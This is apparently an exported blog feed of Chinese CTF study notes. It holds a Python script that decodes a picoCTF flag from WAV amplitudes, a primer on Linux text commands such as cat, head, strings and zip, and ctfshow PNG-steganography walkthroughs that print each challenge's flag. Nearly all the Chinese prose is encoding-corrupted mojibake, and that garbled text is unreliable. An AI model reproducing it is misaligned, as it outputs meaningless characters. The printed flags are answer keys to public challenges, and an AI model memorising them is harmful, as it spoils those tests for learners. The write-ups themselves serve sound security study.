<p>ç›®çš„ï¼šæ”¶é›†wavçš„æ‰€æœ‰æŒ¯å¹…å‘ç°éƒ½æ˜¯åœ¨å¯æ‰“å°å­—ç¬¦çš„asciiç èŒƒå›´å†…</p>
<p>pythonè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> wavfile</span><br><span class="line"></span><br><span class="line">samplerate, data = wavfile.read(<span class="string">&#x27;main.wav&#x27;</span>)</span><br><span class="line"><span class="comment">#åŠ è½½wavæ–‡ä»¶å†…å®¹</span></span><br><span class="line"></span><br><span class="line">rounded_data = []</span><br><span class="line">unique = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    r = <span class="built_in">round</span>(i, -<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#round() æ–¹æ³•è¿”å›æµ®ç‚¹æ•°içš„å››èˆäº”å…¥å€¼</span></span><br><span class="line">    rounded_data.append(r)<span class="comment">#append() æ–¹æ³•ç”¨äºåœ¨åˆ—è¡¨æœ«å°¾æ·»åŠ æ–°çš„å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">if</span> r <span class="keyword">in</span> unique:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        unique.append(r)</span><br><span class="line">unique.sort()<span class="comment">#sort() å‡½æ•°ç”¨äºå¯¹åŸåˆ—è¡¨è¿›è¡Œæ’åº</span></span><br><span class="line"></span><br><span class="line">flag_hex = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> rounded_data:</span><br><span class="line">    flag_hex.append(<span class="built_in">hex</span>(unique.index(a))[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>.fromhex(<span class="string">&quot;&quot;</span>.join(flag_hex)).decode())</span><br></pre></td></tr></table></figure>

<p>å…³äºscipy.io.wavfileï¼š</p>
<p><a href="https://www.cnblogs.com/ytxwzqin/p/12124788.html">https://www.cnblogs.com/ytxwzqin/p/12124788.html</a></p>
<p><a href="https://docs.scipy.org/doc/scipy/reference/generated/scipy.io.wavfile.read.html">https://docs.scipy.org/doc/scipy/reference/generated/scipy.io.wavfile.read.html</a></p>
<p>è„šæœ¬æ¥è‡ªï¼š<a href="https://github.com/JeffersonDing/CTF/tree/master/pico_CTF_2021/fnc/surfing_the_waves">https://github.com/JeffersonDing/CTF/tree/master/pico_CTF_2021/fnc/surfing_the_waves</a></p>
<p>å¾—åˆ°flagï¼š<code>picoCTF&#123;mU21C_1s_1337_6e0a8181&#125;</code></p>
]]></content>
      <categories>
        <category>æ¯”èµ›å¤ç°</category>
      </categories>
  </entry>
  <entry>
    <title>Linuxå‘½ä»¤ (æœªå®Œ)</title>
    <url>/2021/04/29/linux%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<p><font color=#999AAA >ç®€å•è®°å½•ä¸€äº›åšé¢˜å¸¸ç”¨çš„Linuxå‘½ä»¤</font></p>
<h3 id="cat-amp-tac"><a href="#cat-amp-tac" class="headerlink" title="cat &amp; tac"></a>cat &amp; tac</h3><p>cat (è‹±æ–‡å…¨æ‹¼ï¼šconcatenate) å‘½ä»¤ç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šã€‚</p>
<p>tac ä»æœ€åä¸€è¡Œæ˜¾ç¤ºï¼Œä½œç”¨ç±»ä¼¼catã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/20210329175513222.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="more-amp-less"><a href="#more-amp-less" class="headerlink" title="more &amp; less"></a>more &amp; less</h3><p>more å‘½ä»¤ç±»ä¼¼äº cat ï¼Œ ä¸è¿‡ä¼šä»¥ä¸€é¡µä¸€é¡µçš„å½¢å¼æ˜¾ç¤ºï¼Œæ›´æ–¹ä¾¿ä½¿ç”¨è€…é€é¡µé˜…è¯»ï¼ŒæŒ‰ç©ºæ ¼ï¼ˆspaceï¼‰é”® æ˜¾ç¤ºä¸‹ä¸€é¡µï¼ŒæŒ‰bé”®å¾€å›æ˜¾ç¤ºï¼Œå¹¶ä¸”è¿˜å…·æœ‰æœç´¢å­—ç¬¦ä¸²çš„åŠŸèƒ½ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/20210329175807115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>less æ“ä½œå’Œä½œç”¨ç±»ä¼¼moreã€‚<br>å…·ä½“æ“ä½œæ–¹å¼ è¾“å…¥ğŸ‘‡æ¥æŸ¥è¯¢</p>
<pre><code>less --help
</code></pre>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>headå‘½ä»¤å¯ç”¨äºæŸ¥çœ‹æ–‡ä»¶çš„å¼€å¤´éƒ¨åˆ†çš„å†…å®¹ï¼Œæœ‰ä¸€ä¸ªå¸¸ç”¨çš„å‚æ•° -n ç”¨äºæ˜¾ç¤ºè¡Œæ•°ï¼Œé»˜è®¤ä¸º10ï¼Œå³æ˜¾ç¤º10è¡Œã€‚<br><img src="https://img-blog.csdnimg.cn/20210329180408810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>tailå‘½ä»¤å¯ç”¨äºæŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ï¼Œæœ‰ä¸ªå¸¸ç”¨å‚æ•° -f ç”¨æ¥æŸ¥é˜…æ­£åœ¨æ”¹å˜çš„æ—¥å¿—æ–‡ä»¶ã€‚<br>tail -f filename ä¼šæŠŠfilename æ–‡ä»¶é‡Œçš„æœ€å°¾éƒ¨çš„å†…å®¹æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œå¹¶ä¸”ä¸æ–­çš„åˆ·æ–°ï¼Œåªè¦filename æ›´æ–°å°±å¯ä»¥çœ‹åˆ°æœ€æ–°çš„æ–‡ä»¶å†…å®¹ã€‚<br>è‹¥æ˜¯ç›´æ¥ğŸ‘‡</p>
<pre><code>tail filename
</code></pre>
<p>åˆ™åªä¼šæ˜¾ç¤ºæœ€å10è¡Œå†…å®¹<br><img src="https://img-blog.csdnimg.cn/20210329180834566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h3><p>nlå‘½ä»¤ç±»ä¼¼äºcatï¼Œåªä¸è¿‡nlä¼šæ˜¾ç¤ºè¡Œå·ï¼Œæ˜¯ä¸€ä¸ªæ¯”è¾ƒä¸å¸¸ç”¨çš„å‘½ä»¤ï¼ˆcatè¢«bançš„è¯å¯ä»¥è¯•è¯•nl<br><img src="https://img-blog.csdnimg.cn/20210329180933924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>sortå‘½ä»¤å¯ä»¥ç”¨æ¥å°†æ–‡æœ¬å†…å®¹åŠ ä»¥æ’åºã€‚sortå¯é’ˆå¯¹æ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼Œä»¥è¡Œä¸ºå•ä½æ¥æ’åºã€‚<br><img src="https://img-blog.csdnimg.cn/20210329181057188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="od"><a href="#od" class="headerlink" title="od"></a>od</h3><p>od å‘½ä»¤ç”¨äºè¾“å‡ºæ–‡ä»¶å†…å®¹ï¼ˆä»¥å…«è¿›åˆ¶å½¢å¼</p>
<p><img src="https://img-blog.csdnimg.cn/20210329181149574.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>awk æ˜¯ä¸€ç§å¤„ç†æ–‡æœ¬æ–‡ä»¶çš„è¯­è¨€ï¼Œæ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬åˆ†æå·¥å…·ã€‚ã€è¯¦æƒ…è¯·è‡ªè¡Œbaiduï¼Œè¿™é‡Œåªä¸¾å‡ºç®€å•ä¾‹å­ã€‘</p>
<pre><code>awk -va=1 &#39;&#123;print $1,$1+a&#125;&#39; 123.txt
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20210329181557589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><p>cutå‘½ä»¤ç”¨äºæ˜¾ç¤ºæ¯è¡Œä»å¼€å¤´ç®—èµ·åˆ°nçš„æ–‡å­—</p>
<pre><code>xxx | cut -b n
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20210329182933895.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>grep å‘½ä»¤ç”¨äºæŸ¥æ‰¾æ–‡ä»¶é‡Œå¤åˆæ¡ä»¶çš„å­—ç¬¦ä¸²</p>
<pre><code>grep test *file
</code></pre>
<p>åœ¨å½“å‰ç›®å½•ä¸­æŸ¥æ‰¾åç¼€æœ‰fileçš„æ–‡ä»¶ä¸­çš„åŒ…å«testå­—ç¬¦ä¸²çš„æ–‡ä»¶å¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²æ‰€åœ¨çš„è¡Œæ•°ã€‚</p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="uniqï¼ˆæœªå®Œï¼‰"><a href="#uniqï¼ˆæœªå®Œï¼‰" class="headerlink" title="uniqï¼ˆæœªå®Œï¼‰"></a>uniqï¼ˆæœªå®Œï¼‰</h3><p>uniqå‘½ä»¤ç”¨äºæ£€æŸ¥åŠåˆ é™¤æ–‡æœ¬æ–‡ä»¶ä¸­é‡å¤å‡ºç°çš„è¡Œåˆ—ï¼Œä¸€èˆ¬ä¸sortç»“åˆä½¿ç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šuniq [é€‰é¡¹]... [æ–‡ä»¶]</span><br><span class="line">Filter adjacent matching lines from INPUT (or standard input),</span><br><span class="line">writing to OUTPUT (or standard output).</span><br><span class="line"></span><br><span class="line">With no options, matching lines are merged to the first occurrence.</span><br><span class="line"></span><br><span class="line">å¿…é€‰å‚æ•°å¯¹é•¿çŸ­é€‰é¡¹åŒæ—¶é€‚ç”¨ã€‚</span><br><span class="line">  -c, --count           prefix lines by the number of occurrences</span><br><span class="line">  -d, --repeated        only print duplicate lines, one for each group</span><br><span class="line">  -D                    print all duplicate lines</span><br><span class="line">      --all-repeated[&#x3D;METHOD]  like -D, but allow separating groups</span><br><span class="line">                                 with an empty line;</span><br><span class="line">                                 METHOD&#x3D;&#123;none(default),prepend,separate&#125;</span><br><span class="line">  -f, --skip-fields&#x3D;N   avoid comparing the first N fields</span><br><span class="line">      --group[&#x3D;METHOD]  show all items, separating groups with an empty line;</span><br><span class="line">                          METHOD&#x3D;&#123;separate(default),prepend,append,both&#125;</span><br><span class="line">  -i, --ignore-case     ignore differences in case when comparing</span><br><span class="line">  -s, --skip-chars&#x3D;N    avoid comparing the first N characters</span><br><span class="line">  -u, --unique          only print unique lines</span><br><span class="line">  -z, --zero-terminated     line delimiter is NUL, not newline</span><br><span class="line">  -w, --check-chars&#x3D;N	å¯¹æ¯è¡Œç¬¬N ä¸ªå­—ç¬¦ä»¥åçš„å†…å®¹ä¸ä½œå¯¹ç…§</span><br><span class="line">      --help		æ˜¾ç¤ºæ­¤å¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º</span><br><span class="line">      --version		æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡º</span><br><span class="line">è‹¥åŸŸä¸­ä¸ºå…ˆç©ºå­—ç¬¦(é€šå¸¸åŒ…æ‹¬ç©ºæ ¼ä»¥åŠåˆ¶è¡¨ç¬¦)ï¼Œç„¶åéç©ºå­—ç¬¦ï¼ŒåŸŸä¸­å­—ç¬¦å‰çš„ç©ºå­—ç¬¦å°†è¢«è·³è¿‡ã€‚</span><br></pre></td></tr></table></figure>



<p><img src="https://img-blog.csdnimg.cn/20210329223625475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><p>stringsæ‰“å°æ–‡ä»¶ä¸­å¯æ‰“å°çš„å­—ç¬¦ï¼Œå¯ä»¥æ˜¯æ–‡æœ¬æ–‡ä»¶(test.c)ã€å¯æ‰§è¡Œæ–‡ä»¶ã€åŠ¨æ€é“¾æ¥åº“ã€é™æ€é“¾æ¥åº“ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç”¨æ³•ï¼šstrings [é€‰é¡¹] [æ–‡ä»¶]</span><br><span class="line"> æ‰“å° [æ–‡ä»¶] (é»˜è®¤ä¸ºæ ‡å‡†è¾“å…¥) ä¸­å¯æ‰“å°çš„å­—ç¬¦ä¸²</span><br><span class="line"> é€‰é¡¹ä¸ºï¼š</span><br><span class="line">  -a - --all                Scan the entire file, not just the data section [default]</span><br><span class="line">  -d --data                 Only scan the data sections in the file</span><br><span class="line">  -f --print-file-name      Print the name of the file before each string</span><br><span class="line">  -n --bytes&#x3D;[number]       Locate &amp; print any NUL-terminated sequence of at</span><br><span class="line">  -&lt;number&gt;                   least [number] characters (default 4).</span><br><span class="line">  -t --radix&#x3D;&#123;o,d,x&#125;        Print the location of the string in base 8, 10 or 16</span><br><span class="line">  -w --include-all-whitespace Include all whitespace as valid string characters</span><br><span class="line">  -o                        An alias for --radix&#x3D;o</span><br><span class="line">  -T --target&#x3D;&lt;BFDNAME&gt;     Specify the binary file format</span><br><span class="line">  -e --encoding&#x3D;&#123;s,S,b,l,B,L&#125; Select character size and endianness:</span><br><span class="line">                            s &#x3D; 7-bit, S &#x3D; 8-bit, &#123;b,l&#125; &#x3D; 16-bit, &#123;B,L&#125; &#x3D; 32-bit</span><br><span class="line">  -s --output-separator&#x3D;&lt;string&gt; String used to separate strings in output.</span><br><span class="line">  @&lt;file&gt;                   Read options from &lt;file&gt;</span><br><span class="line">  -h --help                 Display this information</span><br><span class="line">  -v -V --version           Print the program&#39;s version number</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stringsï¼šæ”¯æŒçš„ç›®æ ‡ï¼š elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 a.out-i386-linux pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 plugin srec symbolsrec verilog tekhex binary ihex</span><br></pre></td></tr></table></figure>


<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h3><p>rev å‘½ä»¤å°†æ–‡ä»¶ä¸­çš„æ¯è¡Œå†…å®¹ä»¥å­—ç¬¦ä¸ºå•ä½ååºè¾“å‡ºã€‚<br><img src="https://img-blog.csdnimg.cn/20210329224438294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<pre><code>ç”¨æ³•ï¼šrev [é€‰é¡¹] [æ–‡ä»¶ ...]

å¯¹æˆè¡Œçš„å†…å®¹é€å­—ç¿»è½¬ã€‚

é€‰é¡¹ï¼š
 -h, --help     display this help
 -V, --version  display version
</code></pre>
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>zipæ˜¯ä¸ªä½¿ç”¨å¹¿æ³›çš„å‹ç¼©ç¨‹åºï¼Œå‹ç¼©åæ–‡ä»¶åç¼€ä¸º.zip<br><img src="https://img-blog.csdnimg.cn/20210329224829907.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Copyright (c) 1990-2008 Info-ZIP - Type &#39;zip &quot;-L&quot;&#39; for software license.</span><br><span class="line">Zip 3.0 (July 5th 2008). Usage:</span><br><span class="line">zip [-options] [-b path] [-t mmddyyyy] [-n suffixes] [zipfile list] [-xi list]</span><br><span class="line">  The default action is to add or replace zipfile entries from list, which</span><br><span class="line">  can include the special name - to compress standard input.</span><br><span class="line">  If zipfile and list are omitted, zip compresses stdin to stdout.</span><br><span class="line">  -f   freshen: only changed files  -u   update: only changed or new files</span><br><span class="line">  -d   delete entries in zipfile    -m   move into zipfile (delete OS files)</span><br><span class="line">  -r   recurse into directories     -j   junk (don&#39;t record) directory names</span><br><span class="line">  -0   store only                   -l   convert LF to CR LF (-ll CR LF to LF)</span><br><span class="line">  -1   compress faster              -9   compress better</span><br><span class="line">  -q   quiet operation              -v   verbose operation&#x2F;print version info</span><br><span class="line">  -c   add one-line comments        -z   add zipfile comment</span><br><span class="line">  -@   read names from stdin        -o   make zipfile as old as latest entry</span><br><span class="line">  -x   exclude the following names  -i   include only the following names</span><br><span class="line">  -F   fix zipfile (-FF try harder) -D   do not add directory entries</span><br><span class="line">  -A   adjust self-extracting exe   -J   junk zipfile prefix (unzipsfx)</span><br><span class="line">  -T   test zipfile integrity       -X   eXclude eXtra file attributes</span><br><span class="line">  -y   store symbolic links as the link instead of the referenced file</span><br><span class="line">  -e   encrypt                      -n   don&#39;t compress these suffixes</span><br><span class="line">  -h2  show more help</span><br></pre></td></tr></table></figure>


<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">

<h3 id="ls-al"><a href="#ls-al" class="headerlink" title="ls -al"></a>ls -al</h3><p><img src="https://img-blog.csdnimg.cn/20210329224947182.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>Linuxç³»ç»Ÿä¸­åˆ†ä¸ºä¸‰ç§ç”¨æˆ·ï¼š<br>ç”¨æˆ·ç»„ï¼Œå…¶ä»–ç»„ï¼Œrootã€‚rootå¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è®¿é—®ä»»ä½•æ•°æ®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰ç³»ç»Ÿä¸Šçš„è´¦å·ä¸ä¸€èˆ¬èº«ä»½ç”¨æˆ·ï¼Œrootçš„ç›¸å…³ä¿¡æ¯éƒ½è®°å½•åœ¨/etc/passwdè¿™ä¸ªæ–‡ä»¶ä¸­ï¼›ä¸ªäººå¯†ç åˆ™è®°å½•åœ¨/etc/shadowè¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œæ­¤å¤–Linuxæ‰€æœ‰ç»„åéƒ½è®°å½•åœ¨/etc/groupä¸­ã€‚</p>
<p>ç¬¬ä¸€ä¸ªå­—ç¬¦è¡¨ç¤ºçš„æ–‡ä»¶çš„ç§ç±»ï¼š<br>1ã€dæ˜¯ç›®å½•<br>2ã€-æ˜¯æ–‡ä»¶<br>3ã€|æ˜¯é“¾æ¥æ–‡ä»¶<br>4ã€bè®¾å¤‡æ–‡ä»¶é‡Œé¢å¯ä¾›å‚¨å­˜çš„å‘¨è¾¹è®¾å¤‡<br>5ã€cè¡¨ç¤ºè®¾å¤‡æ–‡ä»¶é‡Œè¾¹çš„ä¸²è¡Œç«¯å£è®¾å¤‡<br>ç¬¬ä¸€ç»„rwxè¡¨ç¤ºæ‹¥æœ‰è€…å¯å…·å¤‡çš„æƒé™<br>ç¬¬äºŒç»„rwxè¡¨ç¤ºç”¨æˆ·ç»„è´¦å·çš„æƒé™<br>ç¬¬ä¸‰ç»„rwxè¡¨ç¤ºå…¶ä»–è€…çš„æƒé™<br>//é»˜è®¤rootç”¨æˆ·éƒ½å¯ä»¥è¿›è¡Œè¯»å†™<br>ç¬¬äºŒæ  1è¡¨ç¤ºæœ‰å¤šå°‘æ–‡ä»¶é“¾æ¥åˆ°æ­¤èŠ‚ç‚¹ä¸Š<br>ç¬¬ä¸‰æ è®°å½•æ–‡ä»¶æ‹¥æœ‰è€…<br>ç¬¬å››æ è®°å½•æ–‡ä»¶æ‹¥æœ‰ç»„<br>ç¬¬äº”æ è®°å½•æ–‡ä»¶å¤§å°<br>ç¬¬å…­æ è®°å½•æ—¶é—´<br>ç¬¬ä¸ƒæ è®°å½•æ–‡ä»¶åï¼Œå¦‚æœæ–‡ä»¶åä¹‹å‰å¤šä¸€ä¸ª-ï¼Œåˆ™è¡¨ç¤ºè¿™ä¸ªæ–‡ä»¶æ˜¯éšè—æ–‡ä»¶.</p>
]]></content>
      <categories>
        <category>linuxå‘½ä»¤</category>
      </categories>
  </entry>
  <entry>
    <title>ctfshow miscå…¥é—¨ pngéšå†™å…¥é—¨</title>
    <url>/2021/06/03/png%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<script src='https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js'></script>

<h2 id="One-PieNG-1"><a href="#One-PieNG-1" class="headerlink" title="One PieNG 1"></a>One PieNG 1</h2><p>é™„ä»¶çš„æ–‡ä»¶åå°±æ˜¯flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#St4rt_fr0m_th1s_5tr1ng#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-2"><a href="#One-PieNG-2" class="headerlink" title="One PieNG 2"></a>One PieNG 2</h2><p>å›¾ç‰‡ä¸Šçš„å­—ç¬¦ä¸²å³ä¸ºflag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#Th1s_i5_s0_34sy!!!#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-3"><a href="#One-PieNG-3" class="headerlink" title="One PieNG 3"></a>One PieNG 3</h2><p>ä¿®æ”¹å›¾ç‰‡é«˜åº¦å¾—åˆ°flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#Pn9_He1gh7_6e_ch4ng3d#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-4"><a href="#One-PieNG-4" class="headerlink" title="One PieNG 4"></a>One PieNG 4</h2><p>ä¾æ—§æ˜¯ä¿®æ”¹å›¾ç‰‡é«˜åº¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#M4yb3_we_sh0uld_9o_d33per#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-5"><a href="#One-PieNG-5" class="headerlink" title="One PieNG 5"></a>One PieNG 5</h2><p>ç”¨stegsolveæ‰“å¼€åŸé™„ä»¶</p>
<p><img src="https://img.vim-cn.com/c3/72ce354cbf712a710dec421a7e470f87159086.png"></p>
<p>bé€šé“æœ€ä½ä¸ºéšå†™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#You_st3gs0lved_me!!!#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-6"><a href="#One-PieNG-6" class="headerlink" title="One PieNG 6"></a>One PieNG 6</h2><p>LSBéšå†™</p>
<p>stegsolveçš„<code>data extract</code>æ¨¡å—</p>
<p><img src="https://img.vim-cn.com/86/0cde27dfef2bc1979a8e955c4d3c059edbdb0f.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#LSB_1s_v3ry_e4sy_righ7?#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-7"><a href="#One-PieNG-7" class="headerlink" title="One PieNG 7"></a>One PieNG 7</h2><p>å°è¯•ä¸€æ³¢columnï¼Œæœ€ç»ˆåœ¨Rã€Gçš„0é€šé“æ‰¾åˆ°äº†</p>
<p><img src="https://img.vim-cn.com/ed/718595e0ec75cbae3d1343676d20eebf95b181.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#5omet1mes_LSB_g0es_co1omn_f1r5t#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-8"><a href="#One-PieNG-8" class="headerlink" title="One PieNG 8"></a>One PieNG 8</h2><p>çœ‹åˆ°Rã€Gã€Bçš„7é€šé“å·¦ä¸Šè§’éƒ½æœ‰ç‚¹é—®é¢˜ï¼Œå°è¯•ä¸€æ³¢</p>
<p><img src="https://img.vim-cn.com/0f/7bca231de81d46a42929d992eec12e7bf4338c.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#zsteg_do35_no7_a1w4ys_w0rk#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-9"><a href="#One-PieNG-9" class="headerlink" title="One PieNG 9"></a>One PieNG 9</h2><p>å¯ä»¥å‘ç°åœ¨ æ¯ä¸€ä¸ªè‰²é“çš„0é€šé“ä¸Šçš„å·¦ä¸Šè§’éƒ½æœ‰ä¸€æ®µlsbéšå†™ï¼Œè€Œåœ¨1ã€2é€šé“ä¸Šçš„æ¯”0é€šé“ä¸Šçš„è¿˜è¦é•¿</p>
<p><img src="https://img.vim-cn.com/25/6caa75c51b70da4ca02a4ec1ace65a4b88d8af.png"></p>
<p>çœ‹åˆ°PKç›´æ¥save bin å­˜ä¸ºzipæ–‡ä»¶</p>
<p>æ‰“å¼€å‹ç¼©åŒ…é‡Œè¾¹æœ‰ä¸ªtxt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#Wh4t_1s_6it_0rder_4nd_y0u_c4n_LSB_b1nd4ta_to0#&#125;</span><br></pre></td></tr></table></figure>

<h2 id="One-PieNG-10"><a href="#One-PieNG-10" class="headerlink" title="One PieNG 10"></a>One PieNG 10</h2><p>010editoræ‰“å¼€æ‰¾åˆ°flag</p>
<p><img src="https://img.vim-cn.com/92/a2c17c59722a424eb306fd91a8dc35c0f083b4.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;#A_k3y_1n_exif#&#125;</span><br></pre></td></tr></table></figure>



<h2 id="One-PieNG-11"><a href="#One-PieNG-11" class="headerlink" title="One PieNG 11"></a>One PieNG 11</h2><p>æŸ¥çœ‹å›¾ç‰‡çš„exif   <a href="https://exif.tuchong.com/">åœ¨çº¿ç½‘ç«™</a></p>
<table>
<thead>
<tr>
<th>XMP-photoshop</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>DocumentAncestors</td>
<td>23415F6B65795F6672306D5F50683074307368307023</td>
</tr>
<tr>
<td>åŸå¸‚</td>
<td>b58/3AjtPrXQJuhFwguK7nqu4ZpsqMLwU</td>
</tr>
</tbody></table>
<p>å°†åŸå¸‚å¯¹åº”çš„å€¼è¿›è¡Œ<a href="http://ctf.ssleye.com/base58w.html">base58è§£ç </a></p>
